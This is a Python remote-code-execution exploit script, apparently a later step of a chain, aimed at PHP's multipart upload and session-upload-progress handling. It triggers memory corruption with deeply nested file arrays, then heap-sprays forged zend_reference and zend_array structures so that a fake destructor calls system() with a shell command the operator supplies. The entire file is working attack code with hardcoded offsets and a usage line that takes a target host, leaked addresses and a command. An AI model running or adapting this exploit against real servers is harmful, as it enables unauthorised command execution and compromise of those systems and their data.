#!/usr/bin/env python3
import socket, struct, sys, time

ZIF_SYSTEM = 0x465370
S_OFFSET = 0xF5398
BND = b"C" * 10


def part(name, value=b"", filename=None, ctype=None):
    h = b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        h += b'; filename="' + filename + b'"'
    if ctype is not None:
        h += b"\r\nContent-Type: " + ctype
    return h + b"\r\n\r\n" + value + b"\r\n"


def post(host, port, body, timeout=120.0):
    head = (b"POST /index.php HTTP/1.1\r\nHost: %s\r\n"
            b"Content-Type: multipart/form-data; boundary=%s\r\n"
            b"Content-Length: %d\r\nConnection: close\r\n\r\n"
            % (host.encode(), BND, len(body)))
    s = socket.create_connection((host, port), timeout)
    s.settimeout(timeout)
    try:
        s.sendall(head + body)
        while s.recv(65536):
            pass
    except OSError:
        pass
    finally:
        s.close()


def arm(host, port):                               # amplified OOM (as in step 2)
    body = bytearray()
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(115):
        body += part(b"%03d" % i, b"x")
    for i in range(880):
        name = (b"files[R%05d]" % i) + b"[a]" * 62      # 64 levels deep
        body += part(name, b"", filename=b"", ctype=b"application/octet-stream")
    body += b"--" + BND + b"--\r\n"
    post(host, port, bytes(body))
    time.sleep(0.2)


def fake_array(table_addr, system_addr, cmd):      # 384-byte fake zend_array
    ht = bytearray(384)
    struct.pack_into("<II", ht, 0x00, 1, 7)                 # refcount=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # static keys, -8 mask
    struct.pack_into("<Q", ht, 0x10, table_addr + 0x20)     # arData -> bucket
    struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed / nNumOfEl
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x30, system_addr)           # pDestructor = system
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x10, system_addr)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x50, table_addr + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1.type = IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106)             # fake zend_string hdr
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd                          # command at S + 0x98
    return bytes(ht)


def spray_value(ptr, vl=384):                      # fake zend_reference -> ptr
    v = bytearray(b"S" * vl)
    ref = bytearray(32)
    struct.pack_into("<I", ref, 0, 1)                       # refcount = 1
    ref[4] = 0x0A                                           # IS_REFERENCE
    struct.pack_into("<Q", ref, 8, ptr)                     # points at fake array
    struct.pack_into("<I", ref, 16, 0x0107)
    off = 8
    while off + 32 <= vl:                                   # one every 32 bytes
        v[off:off + 32] = ref
        off += 32
    return bytes(v)


def fire(host, port, heap, module, cmd, s_off):
    table_addr, system_addr = heap + s_off, module + ZIF_SYSTEM
    print("fire: table=%#x system=%#x cmd=%r" % (table_addr, system_addr, cmd))
    sv, ht = spray_value(table_addr), fake_array(table_addr, system_addr, cmd)
    sname = lambda p, i: (p + b"%09d" % i + b"xxxxxxxxxx")[:10]
    body = bytearray()
    for i in range(500):                                    # spray before "ht"
        body += part(sname(b"s", i), sv)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(495):                                    # spray after "ht"
        body += part(sname(b"t", i), sv)
    body += b"--" + BND + b"--\r\n"
    post(host, port, bytes(body), timeout=30.0)
    time.sleep(0.4)


if __name__ == "__main__":
    if len(sys.argv) not in (6, 7):
        sys.exit("usage: python3 fire.py <host> <port> <chunk> <libphp> '<cmd>' [s_off]")
    host, port = sys.argv[1], int(sys.argv[2])
    heap, module = int(sys.argv[3], 0), int(sys.argv[4], 0)
    cmd = sys.argv[5].encode()
    s_off = int(sys.argv[6], 0) if len(sys.argv) == 7 else S_OFFSET
    arm(host, port)
    fire(host, port, heap, module, cmd, s_off)
